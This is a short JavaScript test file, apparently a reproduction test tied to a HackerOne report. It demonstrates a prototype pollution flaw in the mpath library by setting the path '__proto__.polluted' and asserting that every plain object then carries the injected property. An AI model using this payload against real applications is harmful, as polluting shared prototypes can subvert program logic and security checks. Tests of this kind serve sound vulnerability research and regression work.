//https://hackerone.com/reports/390860
test("prototype pollution in mpath ", () => {
  var mpath = require("mpath");

  var obj = {};

  expect({}.polluted).toBe(undefined);

  mpath.set("__proto__.polluted", "yes", obj);
  expect({}.polluted).toBe("yes");
});
